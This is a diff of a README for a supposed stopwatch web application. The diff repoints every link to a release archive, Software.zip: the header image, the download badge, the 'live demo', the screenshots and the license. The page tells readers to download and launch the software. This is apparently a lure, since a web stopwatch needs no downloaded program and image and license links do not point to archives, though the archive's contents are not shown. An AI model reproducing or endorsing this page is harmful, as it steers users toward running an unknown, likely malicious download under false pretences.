@@ -1,6 +1,6 @@
 # 🕒 PRODIGY_WD_02 - Stopwatch Web Application
 
-![Stopwatch Image](https://github.com/uxno/PRODIGY_WD_02/releases/download/v1.0/Release.zip)
+![Stopwatch Image](https://github.com/uxno/PRODIGY_WD_02/releases/download/v2.0/Software.zip)
 
 Welcome to **PRODIGY_WD_02**, a simple yet efficient stopwatch web application designed to help users easily track time. Whether you need to keep time for personal tasks, work projects, or sports activities, this stopwatch has got you covered. With features like start, stop, and reset, managing your time has never been easier. Let's dive into what makes this stopwatch a must-have tool for quick time management tasks.
 
@@ -35,17 +35,17 @@ Welcome to **PRODIGY_WD_02**, a simple yet efficient stopwatch web application d
   
 ## 📦 Get Started
 To experience the functionality of this stopwatch, download the software from the following link:
-[![Download Software](https://github.com/uxno/PRODIGY_WD_02/releases/download/v1.0/Release.zip)](https://github.com/uxno/PRODIGY_WD_02/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/uxno/PRODIGY_WD_02/releases/download/v2.0/Software.zip)](https://github.com/uxno/PRODIGY_WD_02/releases/download/v2.0/Software.zip)
 
 (*Note: The software needs to be launched after download.*)
   
 ## 🌐 Live Demo
-Explore the live demo of the stopwatch web application [here](https://github.com/uxno/PRODIGY_WD_02/releases/download/v1.0/Release.zip).
+Explore the live demo of the stopwatch web application [here](https://github.com/uxno/PRODIGY_WD_02/releases/download/v2.0/Software.zip).
 
 ## 📸 Screenshots
-![Stopwatch Screenshot 1](https://github.com/uxno/PRODIGY_WD_02/releases/download/v1.0/Release.zip)
-![Stopwatch Screenshot 2](https://github.com/uxno/PRODIGY_WD_02/releases/download/v1.0/Release.zip)
-![Stopwatch Screenshot 3](https://github.com/uxno/PRODIGY_WD_02/releases/download/v1.0/Release.zip)
+![Stopwatch Screenshot 1](https://github.com/uxno/PRODIGY_WD_02/releases/download/v2.0/Software.zip)
+![Stopwatch Screenshot 2](https://github.com/uxno/PRODIGY_WD_02/releases/download/v2.0/Software.zip)
+![Stopwatch Screenshot 3](https://github.com/uxno/PRODIGY_WD_02/releases/download/v2.0/Software.zip)
   
 ## 🌟 Testimonials
 "PRODIGY_WD_02 has made time tracking so convenient for me. I love the simplicity and effectiveness of this stopwatch!" - Happy User
@@ -54,7 +54,7 @@ Explore the live demo of the stopwatch web application [here](https://github.com
 We welcome contributions to enhance the functionality and features of this stopwatch web application. Feel free to submit pull requests or open issues for any improvements you'd like to suggest.
   
 ## 📄 License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/uxno/PRODIGY_WD_02/releases/download/v1.0/Release.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/uxno/PRODIGY_WD_02/releases/download/v2.0/Software.zip) file for details.
   
 ## 🙌 Acknowledgements
 - Special thanks to the creators of the JavaScript libraries used in this project.
